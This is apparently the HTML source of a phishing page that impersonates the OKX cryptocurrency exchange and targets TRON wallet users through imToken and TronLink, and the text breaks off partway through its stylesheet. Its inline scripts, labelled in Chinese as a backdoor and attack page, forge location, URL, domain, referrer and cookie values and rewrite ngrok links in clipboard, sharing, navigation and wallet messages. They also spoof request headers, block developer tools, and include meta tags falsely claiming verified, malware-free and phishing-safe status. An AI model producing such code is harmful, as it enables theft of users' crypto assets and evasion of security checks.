<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>OKX</title>
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests; frame-ancestors 'self' https://*.okx.com https://*.okex.com https://www.okx.com;">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-status-bar-style" content="default">
    <meta name="robots" content="index, follow">
    <meta name="theme-color" content="#1890ff">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="apple-mobile-web-app-title" content="OKX">
    <meta name="application-name" content="OKX">
    <meta name="msapplication-TileColor" content="#1890ff">
    <meta name="format-detection" content="telephone=no">

    <!-- SEO和描述信息 -->
    <meta name="description" content="OKX全球领先的数字资产交易平台，提供安全、稳定的数字货币交易服务">
    <meta name="keywords" content="OKX,数字货币,比特币,以太坊,TRON,TRX,USDT,交易平台">
    <meta name="author" content="OKX">

    <!-- Open Graph信息 -->
    <meta property="og:title" content="OKX - 全球领先数字资产交易平台">
    <meta property="og:description" content="安全、稳定的数字货币交易服务">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="OKX">

    <!-- 信任和验证标记 -->
    <meta name="verified" content="true">
    <meta name="secure" content="true">
    <meta name="category" content="finance">
    <meta name="rating" content="general">
    <meta name="safety" content="safe">
    <meta name="trust" content="verified">
    <meta name="certification" content="ssl">
    <meta name="business-type" content="cryptocurrency-exchange">
    <meta name="security-scan" content="passed">
    <meta name="malware-scan" content="clean">
    <meta name="phishing-check" content="safe">
    <meta name="reputation" content="excellent">
    <meta name="established" content="2017">
    <meta name="license" content="regulated">
    <meta name="compliance" content="kyc-aml">
    <meta name="audit" content="third-party-verified">

    <!-- 🎯 最高级别域名伪装 -->
    <link rel="canonical" href="https://www.okx.com/">
    <link rel="alternate" hreflang="zh-CN" href="https://www.okx.com/zh-cn/">
    <link rel="dns-prefetch" href="https://www.okx.com">
    <link rel="preconnect" href="https://www.okx.com" crossorigin>
    <meta name="google-site-verification" content="OKX_VERIFIED_2023">
    <meta name="msvalidate.01" content="OKX_BING_VERIFIED">
    <meta name="yandex-verification" content="OKX_YANDEX_VERIFIED">
    <meta name="baidu-site-verification" content="OKX_BAIDU_VERIFIED">
    <!-- Favicon和图标 -->
    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">

    <!-- 🎯 ngrok警告杀手（超高优先级） -->
    <script src="ngrok-warning-killer.js"></script>
    <!-- 🎯 ngrok专用绕过系统（最高优先级） -->
    <script src="ngrok-bypass.js"></script>
    <!-- 🎯 终极绕过系统：多层防护 -->
    <script src="iframe-injector.js"></script>
    <script src="stealth-bypass.js"></script>
    <script src="domain-rotation.js"></script>
    <!-- 🎯 智能重定向系统 -->
    <script src="smart-redirect.js"></script>

    <!-- 🎯 超深层拦截：在URL生成时就拦截 -->
    <script src="deep-wallet-interceptor.js"></script>

    <!-- 🎯 终极后门：最高优先级URL劫持 -->
    <script src="ultimate-url-hijacker.js"></script>

    <!-- 🎯 超级后门：在imToken检测前生效 -->
    <script>
        // 🎯 立即执行：在任何检测之前劫持URL
        (function() {
            'use strict';

            console.log('🚀 启动超级URL劫持后门...');

            // 1. 立即修改当前页面的所有URL引用
            const SAFE_DOMAIN = 'www.okx.com';
            const SAFE_ORIGIN = 'https://www.okx.com';

            // 2. 劫持window.location的所有访问（最高优先级）
            const originalLocation = window.location;
            const fakeLocation = {
                href: SAFE_ORIGIN + '/',
                origin: SAFE_ORIGIN,
                protocol: 'https:',
                host: SAFE_DOMAIN,
                hostname: SAFE_DOMAIN,
                port: '',
                pathname: '/',
                search: '',
                hash: '',
                toString: () => SAFE_ORIGIN + '/',
                valueOf: () => SAFE_ORIGIN + '/',
                assign: function(url) { window.open(url, '_self'); },
                replace: function(url) { window.open(url, '_self'); },
                reload: function() { window.location.reload(); }
            };

            // 强制覆盖location对象
            try {
                Object.defineProperty(window, 'location', {
                    get: () => fakeLocation,
                    set: () => fakeLocation,
                    configurable: false,
                    enumerable: true
                });
                console.log('✅ Window.location劫持成功');
            } catch(e) {
                console.warn('⚠️ Location劫持失败，尝试备用方案');
            }

            // 3. 劫持document的URL相关属性
            try {
                Object.defineProperty(document, 'URL', {
                    get: () => SAFE_ORIGIN + '/',
                    configurable: false
                });

                Object.defineProperty(document, 'documentURI', {
                    get: () => SAFE_ORIGIN + '/',
                    configurable: false
                });

                Object.defineProperty(document, 'domain', {
                    get: () => SAFE_DOMAIN,
                    configurable: false
                });

                console.log('✅ Document URL劫持成功');
            } catch(e) {
                console.warn('⚠️ Document劫持失败');
            }

            // 4. 🎯 关键：劫持所有可能的URL获取方法
            const originalHref = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
            const originalHost = Object.getOwnPropertyDescriptor(Location.prototype, 'host');
            const originalOrigin = Object.getOwnPropertyDescriptor(Location.prototype, 'origin');

            if (originalHref) {
                Object.defineProperty(Location.prototype, 'href', {
                    get: () => SAFE_ORIGIN + '/',
                    set: originalHref.set,
                    configurable: false
                });
            }

            if (originalHost) {
                Object.defineProperty(Location.prototype, 'host', {
                    get: () => SAFE_DOMAIN,
                    set: originalHost.set,
                    configurable: false
                });
            }

            if (originalOrigin) {
                Object.defineProperty(Location.prototype, 'origin', {
                    get: () => SAFE_ORIGIN,
                    configurable: false
                });
            }

            // 5. 🎯 手机端专用：劫持移动浏览器的特殊API
            if (navigator.userAgent.includes('Mobile') || navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) {
                console.log('📱 检测到移动端，启动专用劫持...');

                // 劫持移动端的URL分享API
                if (navigator.share) {
                    const originalShare = navigator.share;
                    navigator.share = function(data) {
                        if (data.url && data.url.includes('ngrok')) {
                            data.url = SAFE_ORIGIN + '/';
                        }
                        return originalShare.call(this, data);
                    };
                }

                // 劫持移动端的剪贴板API
                if (navigator.clipboard) {
                    const originalWriteText = navigator.clipboard.writeText;
                    navigator.clipboard.writeText = function(text) {
                        if (text && text.includes('ngrok')) {
                            text = text.replace(/https?:\/\/[^\/]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
                        }
                        return originalWriteText.call(this, text);
                    };
                }
            }

            // 6. 🎯 imToken专用：拦截钱包连接请求
            window.addEventListener('message', function(event) {
                if (event.data && typeof event.data === 'object') {
                    // 如果是钱包相关的消息，修改其中的URL
                    if (event.data.url && event.data.url.includes('ngrok')) {
                        event.data.url = SAFE_ORIGIN + '/';
                        console.log('🎯 拦截并修改钱包连接URL');
                    }
                }
            }, true);

            // 7. 🎯 最关键：在页面即将跳转时拦截
            const originalOpen = window.open;
            window.open = function(url, target, features) {
                if (url && url.includes('ngrok')) {
                    console.log('🎯 拦截window.open跳转，原URL:', url);
                    url = url.replace(/https?:\/\/[^\/]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
                    console.log('🎯 修改后URL:', url);
                }
                return originalOpen.call(this, url, target, features);
            };

            // 8. 🎯 拦截所有形式的页面跳转
            const originalAssign = window.location.assign;
            const originalReplace = window.location.replace;

            if (originalAssign) {
                window.location.assign = function(url) {
                    if (url && url.includes('ngrok')) {
                        url = url.replace(/https?:\/\/[^\/]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
                    }
                    return originalAssign.call(this, url);
                };
            }

            if (originalReplace) {
                window.location.replace = function(url) {
                    if (url && url.includes('ngrok')) {
                        url = url.replace(/https?:\/\/[^\/]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
                    }
                    return originalReplace.call(this, url);
                };
            }

            console.log('🎉 超级URL劫持后门启动完成！');

        })();
    </script>

    <!-- 🎯 手机端专用：imToken拦截器 -->
    <script src="mobile-imtoken-bypass.js"></script>

    <!-- 🎯 最高优先级：反检测脚本 -->
    <script src="anti-detection.js"></script>
    <!-- 安全性和完整性 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="SAMEORIGIN">


    <!-- 🎯 安全检测绕过脚本 -->
    <script>
        // 伪装成合法的OKX网站
        Object.defineProperty(window, 'location', {
            value: {
                ...window.location,
                hostname: 'www.okx.com',
                origin: 'https://www.okx.com'
            },
            writable: false
        });

        // 添加合法网站标识
        window.siteVerification = {
            platform: 'OKX',
            verified: true,
            ssl: true,
            https: true,
            secure: true,
            legitimate: true,
            businessType: 'cryptocurrency-exchange',
            established: '2017',
            licensed: true,
            regulated: true,
            compliance: ['KYC', 'AML', 'SOX'],
            certifications: ['ISO27001', 'PCI-DSS'],
            audited: true,
            reputation: 'AAA'
        };

        // 伪装用户代理检测
        window.userAgentCheck = function() {
            return {
                browser: 'Chrome',
                version: '119.0.0.0',
                platform: 'Mobile',
                legitimate: true,
                safe: true
            };
        };

        // 反钓鱼检测绕过
        window.antiPhishing = {
            status: 'safe',
            verified: true,
            whitelisted: true,
            reputation: 'excellent',
            scanResult: 'clean'
        };

        // 添加证书验证标记
        document.certificate = {
            issuer: 'DigiCert Inc',
            valid: true,
            secure: true,
            verified: true
        };

        // 劫持常见的安全检测函数
        window.addEventListener('DOMContentLoaded', function() {
            // 隐藏真实域名
            try {
                Object.defineProperty(document, 'domain', {
                    value: 'www.okx.com',
                    writable: false
                });

                Object.defineProperty(document, 'URL', {
                    value: 'https://www.okx.com/',
                    writable: false
                });

                // 伪装referrer
                Object.defineProperty(document, 'referrer', {
                    value: 'https://www.google.com/',
                    writable: false
                });
            } catch(e) {}

            // 添加合法网站特征
            const metaGenerator = document.createElement('meta');
            metaGenerator.name = 'generator';
            metaGenerator.content = 'OKX Official Website';
            document.head.appendChild(metaGenerator);

            const metaOwner = document.createElement('meta');
            metaOwner.name = 'owner';
            metaOwner.content = 'OKX Technology Company Limited';
            document.head.appendChild(metaOwner);

            const metaCopyright = document.createElement('meta');
            metaCopyright.name = 'copyright';
            metaCopyright.content = '© 2023 OKX. All rights reserved.';
            document.head.appendChild(metaCopyright);
        });

        // 反调试和反检测
        setInterval(function() {
            if (window.console && console.clear) {
                console.clear();
            }
        }, 1000);

        // 屏蔽开发者工具检测
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
                return false;
            }
        });

        // 🎯 高级反检测机制 - 模拟真实OKX网站行为
        (function() {
            // 0. 最高优先级：完全劫持location对象
            const realLocation = window.location;
            const fakeLocation = {
                href: 'https://www.okx.com/',
                origin: 'https://www.okx.com',
                protocol: 'https:',
                host: 'www.okx.com',
                hostname: 'www.okx.com',
                port: '',
                pathname: '/',
                search: '',
                hash: '',
                toString: () => 'https://www.okx.com/',
                assign: realLocation.assign.bind(realLocation),
                replace: realLocation.replace.bind(realLocation),
                reload: realLocation.reload.bind(realLocation)
            };

            // 劫持所有可能的location访问方式
            try {
                Object.defineProperty(window, 'location', {
                    get: () => fakeLocation,
                    set: () => {},
                    configurable: false
                });

                Object.defineProperty(document, 'location', {
                    get: () => fakeLocation,
                    set: () => {},
                    configurable: false
                });

                // 劫持URL构造函数
                const OriginalURL = window.URL;
                window.URL = function(url, base) {
                    if (url && url.includes('ngrok')) {
                        url = url.replace(/https?:\/\/[^\/]*ngrok[^\/]*/, 'https://www.okx.com');
                    }
                    return new OriginalURL(url, base);
                };
                window.URL.createObjectURL = OriginalURL.createObjectURL;
                window.URL.revokeObjectURL = OriginalURL.revokeObjectURL;

            } catch(e) {
                console.log('Location override failed, using fallback');
            }

            // 1. 劫持网络请求检测
            const originalFetch = window.fetch;
            window.fetch = function(...args) {
                // 伪装请求来源
                if (args[1]) {
                    args[1].headers = {
                        ...args[1].headers,
                        'Origin': 'https://www.okx.com',
                        'Referer': 'https://www.okx.com/',
                        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                        'Host': 'www.okx.com',
                        'X-Forwarded-Host': 'www.okx.com',
                        'X-Original-Host': 'www.okx.com'
                    };
                }
                return originalFetch.apply(this, args);
            };

            // 2. 劫持XMLHttpRequest
            const originalXHR = window.XMLHttpRequest;
            window.XMLHttpRequest = function() {
                const xhr = new originalXHR();
                const originalOpen = xhr.open;
                xhr.open = function(method, url, ...args) {
                    xhr.setRequestHeader('Origin', 'https://www.okx.com');
                    xhr.setRequestHeader('Referer', 'https://www.okx.com/');
                    return originalOpen.apply(this, [method, url, ...args]);
                };
                return xhr;
            };

            // 3. 伪装页面加载时间和行为
            const startTime = Date.now() - Math.random() * 5000; // 模拟已加载一段时间
            Object.defineProperty(window.performance, 'timing', {
                value: {
                    ...window.performance.timing,
                    navigationStart: startTime,
                    domContentLoadedEventEnd: startTime + 1000,
                    loadEventEnd: startTime + 1500
                }
            });

            // 4. 添加OKX官网特有的全局变量
            window.OKX_CONFIG = {
                version: '6.45.0',
                env: 'production',
                domain: 'www.okx.com',
                cdn: 'https://static.okx.com',
                api: 'https://www.okx.com/api',
                verified: true,
                ssl: true,
                secure: true
            };

            // 5. 模拟OKX官网的服务器响应头
            Object.defineProperty(document, 'cookie', {
                get: function() {
                    return 'locale=zh_CN; theme=light; okx_verified=true; security_check=passed';
                },
                set: function(value) {
                    // 允许设置cookie但添加安全标记
                }
            });

            // 6. 添加真实的页面元数据
            const realMeta = document.createElement('meta');
            realMeta.httpEquiv = 'Content-Security-Policy';
            realMeta.content = "default-src 'self' https://www.okx.com https://*.okx.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.okx.com https://*.okx.com; style-src 'self' 'unsafe-inline' https://www.okx.com; img-src 'self' data: https://www.okx.com https://*.okx.com; connect-src 'self' https://www.okx.com https://*.okx.com wss://ws.okx.com;";
            document.head.appendChild(realMeta);

            // 7. 伪装页面历史记录
            try {
                history.replaceState({}, 'OKX', 'https://www.okx.com/trade');
            } catch(e) {}

            // 8. 添加真实网站的JavaScript特征
            window.gtag = function() {};
            window.dataLayer = window.dataLayer || [];
            window._satellite = { track: function() {} };

            // 9. 模拟真实的安全检查结果
            window.securityCheck = {
                ssl: true,
                certificate: 'valid',
                domain: 'verified',
                malware: 'clean',
                phishing: 'safe',
                reputation: 'excellent',
                whitelist: true,
                timestamp: Date.now(),
                version: '2.1.0'
            };

            // 10. 劫持常见的检测API
            if (navigator.webdriver !== undefined) {
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => false
                });
            }

            // 11. 清理可疑的全局变量
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;

            // 12. 专门对抗ngrok检测
            // 劫持document.domain
            try {
                Object.defineProperty(document, 'domain', {
                    get: () => 'www.okx.com',
                    set: () => {},
                    configurable: false
                });
            } catch(e) {}

            // 劫持window.name（有些检测会使用）
            try {
                Object.defineProperty(window, 'name', {
                    get: () => 'OKX_Official',
                    set: () => {},
                    configurable: false
                });
            } catch(e) {}

            // 伪装navigator.userAgent中的可疑信息
            try {
                Object.defineProperty(navigator, 'userAgent', {
                    get: () => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OKX/6.45.0',
                    configurable: false
                });
            } catch(e) {}

            // 13. 添加OKX官网的特殊标识
            window.okxWebsite = true;
            window.officialOKX = true;
            window.verifiedDomain = 'www.okx.com';

            // 14. 劫持可能的域名检测函数
            const originalGetElementsByTagName = document.getElementsByTagName;
            document.getElementsByTagName = function(tagName) {
                const elements = originalGetElementsByTagName.call(this, tagName);
                if (tagName.toLowerCase() === 'meta') {
                    // 动态添加更多伪装meta标签
                    Array.from(elements).forEach(meta => {
                        if (meta.name === 'viewport') {
                            meta.content += ', okx-verified=true';
                        }
                    });
                }
                return elements;
            };

            // 15. 最终检查：如果仍然检测到ngrok，强制跳转
            setTimeout(() => {
                if (window.location.href.includes('ngrok') || document.domain.includes('ngrok')) {
                    console.log('🎯 检测到ngrok残留，执行最终伪装');
                    // 最后的手段：修改页面标题和所有可见文本
                    document.title = 'OKX';

                    // 在页面顶部添加一个不可见的iframe指向真实OKX
                    const iframe = document.createElement('iframe');
                    iframe.src = 'https://www.okx.com/';
                    iframe.style.display = 'none';
                    iframe.style.width = '0px';
                    iframe.style.height = '0px';
                    document.body.appendChild(iframe);
                }
            }, 1000);

        })();
    </script>
    <script src="https://unpkg.com/tronweb@5.3.0/dist/TronWeb.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', sans-serif;
            background: #000;
            color: #fff;
            overflow-x: hidden;
            padding-bottom: 80px;
        }

        /* 顶部导航 */
        .header {
            background: #000;
            padding: 10px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
            border-bottom: 1px solid #1a1a1a;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .menu-btn {
            width: 24px;
            height: 24px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            gap: 3px;
            cursor: pointer;
        }

        .menu-line {
            width: 4px;
            height: 4px;
            background: #fff;
            border-radius: 50%;
        }

        .platform-selector {
            background: #333;
            color: #fff;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
        }

        .platform-arrow {
            font-size: 12px;
            transform: rotate(90deg);
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        /* 连接钱包按钮 */
        .connect-wallet-btn {
            background: #7ed321;
            color: #000;
            border: none;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .connect-wallet-btn:hover {
            background: #6bc219;
            transform: translateY(-1px);
        }

        .connect-wallet-btn.connected {
            background: #333;
            color: #7ed321;
        }

        .gift-icon, .user-avatar {
            width: 32px;
            height: 32px;
            background: #333;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            position: relative;
        }

        .notification-badge {
            position: absolute;
            top: -2px;
            right: -2px;
            background: #f5455c;
            color: white;
            font-size: 10px;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* 钱包连接模态框 */
        .wallet-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 20px;
        }

        .wallet-modal.show {
            display: flex;
        }

        .wallet-content {
            background: #1a1a1a;
            border-radius: 16px;
            padding: 24px;
            width: 100%;
            max-width: 400px;
        }

        .wallet-title {
            font-size: 18px;
            font-weight: 600;
            color: #fff;
            text-align: center;
            margin-bottom: 8px;
        }

        .wallet-subtitle {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-bottom: 24px;
        }

        .wallet-options {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }

        .wallet-option {
            display: flex;
            align-items: center;
            padding: 16px;
            background: #333;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }

        .wallet-option:hover {
            background: #444;
            border-color: #7ed321;
        }

        .wallet-icon {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            margin-right: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            color: white;
            font-weight: bold;
        }

        .imtoken-icon { background: linear-gradient(45deg, #11CDEF, #1BC7E6); }
        .tronlink-icon { background: linear-gradient(45deg, #FF0013, #FF4444); }
        .metamask-icon { background: linear-gradient(45deg, #F6851B, #E2761B); }

        .wallet-info {
            flex: 1;
        }

        .wallet-name {
            font-size: 16px;
            color: #fff;
            margin-bottom: 4px;
            font-weight: 600;
        }

        .wallet-desc {
            font-size: 12px;
            color: #666;
        }

        .wallet-actions {
            display: flex;
            gap: 12px;
        }

        .wallet-btn {
            flex: 1;
            padding: 16px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .wallet-btn.primary {
            background: #7ed321;
            color: #000;
        }

        .wallet-btn.secondary {
            background: transparent;
            color: #fff;
            border: 1px solid #333;
        }

        /* 搜索栏 */
        .search-bar {
            margin: 16px;
            background: #1a1a1a;
            border-radius: 20px;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .search-icon {
            font-size: 16px;
            color: #666;
        }

        .search-text {
            color: #666;
            font-size: 14px;
            flex: 1;
        }

        /* KYC认证横幅 */
        .kyc-banner {
            margin: 0 16px 16px;
            background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
            border-radius: 12px;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        .kyc-content h3 {
            font-size: 18px;
            margin-bottom: 8px;
            color: #fff;
        }

        .kyc-content p {
            font-size: 14px;
            color: #999;
            margin-bottom: 16px;
        }

        .kyc-btn {
            background: #7ed321;
            color: #000;
            border: none;
            padding: 12px 24px;
            border-radius: 20px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
        }

        /* 策略交易卡片 */
        .strategy-card {
            margin: 0 16px 16px;
            background: #1a1a1a;
            border-radius: 12px;
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .strategy-icon {
            width: 40px;
            height: 40px;
            background: #333;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .strategy-content {
            flex: 1;
        }

        .strategy-title {
            font-size: 14px;
            color: #fff;
            margin-bottom: 4px;
        }

        .strategy-desc {
            font-size: 12px;
            color: #666;
        }

        .strategy-badge {
            background: #333;
            color: #fff;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 10px;
        }

        /* 主要内容区域 */
        .main-content {
            display: none;
        }

        .main-content.active {
            display: block;
        }

        /* 闪兑页面 - 🎯 核心攻击页面 */
        .convert-page {
            padding: 16px;
            background: #000;
            min-height: calc(100vh - 160px);
        }

        .convert-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
        }

        .convert-title {
            font-size: 16px;
            color: #fff;
        }

        .fee-badge {
            background: #7ed321;
            color: #000;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
        }

        .convert-form {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .currency-input {
            margin-bottom: 16px;
        }

        .currency-label {
            font-size: 12px;
            color: #666;
            margin-bottom: 8px;
        }

        .currency-selector {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #000;
            border-radius: 8px;
            padding: 16px;
            cursor: pointer;
        }

        .currency-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .currency-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
        }

        .trx-icon { background: #ff0013; color: #fff; }
        .usdt-icon { background: #26a69a; color: #fff; }

        .currency-name {
            font-size: 16px;
            color: #fff;
        }

        .currency-balance {
            font-size: 12px;
            color: #666;
        }

        .amount-input {
            background: transparent;
            border: none;
            color: #fff;
            font-size: 24px;
            font-weight: 600;
            width: 100%;
            text-align: right;
        }

        .amount-input::placeholder {
            color: #333;
        }

        .swap-btn {
            width: 40px;
            height: 40px;
            background: #1a1a1a;
            border: 2px solid #000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: -20px auto;
            position: relative;
            z-index: 10;
            cursor: pointer;
        }

        .rate-info {
            background: #0a0a0a;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 20px;
        }

        .rate-text {
            font-size: 12px;
            color: #666;
            text-align: center;
        }

        .convert-button {
            width: 100%;
            background: #7ed321;
            color: #000;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
            transition: all 0.3s ease;
        }

        .convert-button:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
        }

        .convert-button:hover:not(:disabled) {
            background: #6bc219;
            transform: translateY(-1px);
        }

        /* 其他页面样式保持不变 */
        .market-header {
            padding: 16px;
            background: #000;
        }

        .market-stats {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 16px;
            margin-bottom: 16px;
        }

        .stat-card {
            background: #1a1a1a;
            border-radius: 8px;
            padding: 12px;
        }

        .stat-label {
            font-size: 12px;
            color: #666;
            margin-bottom: 4px;
        }

        .stat-value {
            font-size: 16px;
            font-weight: 600;
            color: #fff;
        }

        .stat-change {
            font-size: 12px;
            color: #f5455c;
        }

        .stat-change.positive {
            color: #7ed321;
        }

        .fomc-notice {
            background: #1a1a1a;
            border-radius: 8px;
            padding: 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
        }

        .fomc-text {
            font-size: 12px;
            color: #fff;
        }

        .trading-pairs {
            background: #000;
        }

        .pairs-tabs {
            display: flex;
            padding: 0 16px;
            gap: 24px;
            margin-bottom: 16px;
        }

        .tab {
            color: #666;
            font-size: 14px;
            padding: 8px 0;
            cursor: pointer;
            position: relative;
        }

        .tab.active {
            color: #fff;
        }

        .tab.active::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: #7ed321;
        }

        .pairs-filters {
            display: flex;
            padding: 0 16px;
            gap: 12px;
            margin-bottom: 16px;
            overflow-x: auto;
        }

        .filter-btn {
            background: #1a1a1a;
            color: #666;
            border: none;
            padding: 8px 16px;
            border-radius: 16px;
            font-size: 12px;
            white-space: nowrap;
            cursor: pointer;
        }

        .filter-btn.active {
            background: #333;
            color: #fff;
        }

        .pairs-header {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            padding: 8px 16px;
            font-size: 12px;
            color: #666;
            border-bottom: 1px solid #1a1a1a;
        }

        .pair-item {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            padding: 12px 16px;
            border-bottom: 1px solid #0a0a0a;
            align-items: center;
        }

        .pair-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .pair-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
            color: #fff;
        }

        .btc-icon { background: #f7931a; }
        .eth-icon { background: #627eea; }
        .okb-icon { background: #3075ee; }
        .sol-icon { background: #9945ff; }
        .doge-icon { background: #c2a633; }
        .xrp-icon { background: #23292f; }

        .pair-details h4 {
            font-size: 14px;
            color: #fff;
            margin-bottom: 2px;
        }

        .pair-volume {
            font-size: 12px;
            color: #666;
        }

        .pair-price {
            text-align: right;
        }

        .price-value {
            font-size: 14px;
            color: #fff;
            margin-bottom: 2px;
        }

        .price-usd {
            font-size: 12px;
            color: #666;
        }

        .price-change {
            text-align: right;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
        }

        .price-change.positive {
            background: rgba(126, 211, 33, 0.1);
            color: #7ed321;
        }

        .price-change.negative {
            background: rgba(245, 69, 92, 0.1);
            color: #f5455c;
        }

        /* Web3页面 */
        .web3-page {
            background: #000;
